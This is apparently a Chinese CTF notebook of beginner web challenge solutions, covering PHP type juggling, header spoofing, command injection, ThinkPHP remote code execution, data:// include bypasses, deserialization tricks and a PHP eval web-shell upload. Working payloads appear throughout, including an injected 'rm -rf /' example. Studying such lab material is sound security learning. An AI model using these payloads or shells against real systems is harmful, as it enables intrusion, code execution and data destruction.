---
title: web入门
createTime: 2025/03/23 15:32:25
permalink: /security/6n77geb9/
---

## weak auth 弱口令

BurpSuite or Python 字典暴力破解

## simple_php

```php
<?php
show_source(__FILE__);
include("config.php");
$a=@$_GET['a'];
$b=@$_GET['b'];
// 如果 $a 大于0且 $a 为真
if($a==0 and $a){
    echo $flag1;
}
// 如果 $b 是数字，退出脚本
if(is_numeric($b)){
    exit();
}
// 如果 $b 大于 1234，输出 $flag2
if($b>1234){
    echo $flag2;
}
?>
```
> php的数据类型转换

在PHP中，字符串 "0" 会被视为假值，但字符串 "0abc" 会被视为真值。因此，我们可以尝试将 $a 设置为 "0abc"。

而"0abc" == 0 在PHP中为真，因为字符串会被转换为数字 0。


## Training-WWW-Robots

有时候，`robots.txt`会暴露网站的目录结构，而不是保护内容不被抓取。

## command_execution

WAF（Web Application Firewall，Web应用防火墙）

ping 功能通常会调用系统命令来执行网络请求。如果没有对用户输入进行严格的验证和过滤，攻击者可以通过构造恶意输入来`注入额外的系统命令`。

```php
<?php
$ip = $_GET['ip'];
system("ping -c 4 " . $ip);
?>
// ping -c 4 127.0.0.1; rm -rf /
```

## xff_referer

​X-Forwarded-For（XFF）​ 和 ​Referer 是 HTTP 请求头中常见的字段，但它们可以被伪造。X老师提醒小宁这一点，是因为在实际开发和渗透测试中，很多开发者会依赖这些字段进行验证或过滤，而攻击者可以通过伪造这些字段来绕过限制或进行恶意操作。

X-Forwarded-For 是一个 HTTP 请求头，通常用于标识客户端的原始 IP 地址。当请求经过代理服务器或负载均衡器时，代理服务器会将客户端的真实 IP 地址添加到 X-Forwarded-For 中。

Referer 是一个 HTTP 请求头，用于标识请求是从哪个页面或 URL 发起的。

​HTTP 头的本质：HTTP 请求头是由客户端（如浏览器或工具）发送的，客户端可以随意修改这些字段。

```python
import requests

url = "http://61.147.171.105:60835/"

headers = {
    "X-Forwarded-For": "123.123.123.123",
    "Referer": "https://www.google.com",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
}

response = requests.get(url, headers=headers)

response.encoding = "utf-8"

print(response.text)
```

## baby_web

重定向，http请求头

```python
import requests

url = "http://61.147.171.105:56645/index.php"

headers = {
    "X-Forwarded-For": "123.123.123.123",
    "Referer": "https://www.google.com",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
}

response = requests.get(url, headers=headers, allow_redirects=False)

response.encoding = "utf-8"

print(response.text)

headers = response.headers
for key, value in headers.items():
    print(f"{key}: {value}")
```

## simple_js


## PHP2

`index.phps`查看源代码。

```php
<?php
if("admin"===$_GET[id]) {
  echo("<p>not allowed!</p>");
  exit();
}

$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == "admin")
{
  echo "<p>Access granted!</p>";
  echo "<p>Key: xxxxxxx </p>";
}
?>

Can you anthenticate to this website?
```

一次编码不够，二次编码`admin`为`%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65`

## ics-06

```python
import requests

url = "http://61.147.171.105:49811/index.php"

param_name = "id"

for value in range(1, 5000):
    full_url = f"{url}?{param_name}={value}"

    response = requests.get(full_url)

    response.encoding = "utf-8"
    if len(response.text) != 1545:
        print(f"{value} | {len(response.text)}")
```

## unserialize3


## php_rce

think_php漏洞

tail 代替 cat

cat flag绕过

```python
import requests

url = r"http://61.147.171.105:57525//index.php/"

mid = r"?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]="

payload = r"cd /;ca\t /flag"

url = url + mid + payload

response = requests.get(url)

response.encoding = "utf-8"

print(response.text)
```

## Web_php_include

采用其他协议，绕过php过滤

```php
<?php
show_source(__FILE__);
echo $_GET['hello'];
$page=$_GET['page'];
while (strstr($page, "php://")) {
    $page=str_replace("php://", "", $page);
}
include($page);
?>
```

strstr():搜索字符串在另一个字符串中是否存在，如果是，返回字符串及剩余部分，否则返回false

区分大小写

```python
import requests

url = r"http://61.147.171.105:53664/"

payload = "?page=data://text/plain,<?php print_r(scandir('.')); ?>"

url = url + payload

response = requests.get(url)

response.encoding = "utf-8"

print(response.text)

# </code>Array
# (
#     [0] => .
#     [1] => ..
#     [2] => fl4gisisish3r3.php
#     [3] => index.php
#     [4] => phpinfo.php
# )
```

base64 绕过

```python
import requests

url = r"http://61.147.171.105:53664/"

mid = r""

payload = "?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOyA/Pg=="

url = url + mid + payload

response = requests.get(url)

response.encoding = "utf-8"

print(response.text)
```


```py
import requests

url = r"http://61.147.171.105:53664/?page=data://text/plain;base64,"

mid = r""

payload = r"PD9waHAgc3lzdGVtKCJjYXQgZmw0Z2lzaXNpc2gzcjMucGhwIik/Pg=="

url = url + mid + payload

response = requests.get(url)

response.encoding = "utf-8"

print(response.text)
```

## upload1

> [!warning]
> 关闭校园网！关闭校园网！关闭校园网！

一句话木马

上传木马

Burp抓包

```
------WebKitFormBoundaryHp7h1MscgPDf87ns
Content-Disposition: form-data; name="upfile"; filename="attack.png"
Content-Type: image/png

<?php 
@eval($_GET['cmd']);
echo('cmd');
?>
------WebKitFormBoundaryHp7h1MscgPDf87ns--
```

将后缀修改回.php

`payload`=`/upload/1742817543.attack.php/?cmd=system("cd ..;cat flag.php");`

查看源码即可

## warmup

```php
<?php
    // 高亮显示当前 PHP 文件的源代码，通常用于调试或展示代码
    highlight_file(__FILE__);

    // 定义一个名为 emmm 的类
    class emmm
    {
        // 定义一个静态方法 checkFile，用于检查用户提供的文件名是否在白名单中
        public static function checkFile(&$page)
        {
            // 定义一个白名单数组，只有 source.php 和 hint.php 是允许被包含的文件
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];

            // 检查 $page 是否存在且是否为字符串，如果不符合条件，输出错误信息并返回 false
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            // 如果 $page 直接在白名单中，返回 true，允许包含该文件
            if (in_array($page, $whitelist)) {
                return true;
            }

            // 如果 $page 包含查询参数（如 source.php?param=value），则截取 ? 之前的部分
            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );

            // 如果截取后的 $_page 在白名单中，返回 true，允许包含该文件
            if (in_array($_page, $whitelist)) {
                return true;
            }

            // 对 $page 进行 URL 解码，然后再进行同样的截取操作
            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );

            // 如果解码并截取后的 $_page 在白名单中，返回 true，允许包含该文件
            if (in_array($_page, $whitelist)) {
                return true;
            }

            // 如果以上所有检查都未通过，输出错误信息并返回 false，拒绝包含该文件
            echo "you can't see it";
            return false;
        }
    }

    // 检查 $_REQUEST['file'] 是否存在、是否为字符串，并且通过 emmm::checkFile 的检查
    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        // 如果满足条件，包含用户指定的文件并退出脚本
        include $_REQUEST['file'];
        exit;
    } else {
        // 如果条件不满足，输出一个图片，通常用于显示错误或默认页面
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }
```

多次编码

查找flag路径


## 


```php
<?php 
class Demo { 
    private $file = 'index.php';
    public function __construct($file) { 
        $this->file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this->file, true); 
    }
    function __wakeup() { 
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php
            $this->file = 'index.php'; 
        } 
    } 
}
if (isset($_GET['var'])) { 
    $var = base64_decode($_GET['var']); 
    if (preg_match('/[oc]:\d+:/i', $var)) { 
        die('stop hacking!'); 
    } else {
        @unserialize($var); 
    } 
} else { 
    highlight_file("index.php"); 
} 
?>
```


```php
<?php 
class Demo { 
    private $file = 'index.php';
    public function __construct($file) { 
        $this->file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this->file, true); 
    }
    function __wakeup() { 
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php
            $this->file = 'index.php'; 
        } 
    } 
}
$A = new Demo ('fl4g.php');					//创建对象
$C = serialize($A);                     //对对象A进行序列化
$C = str_replace('O:4','O:+4',$C);      //绕过正则表达式过滤
$C = str_replace(':1:',':2:',$C); 		//wakeup绕过
var_dump($C);
var_dump(base64_encode($C));            //base64加密

?>
```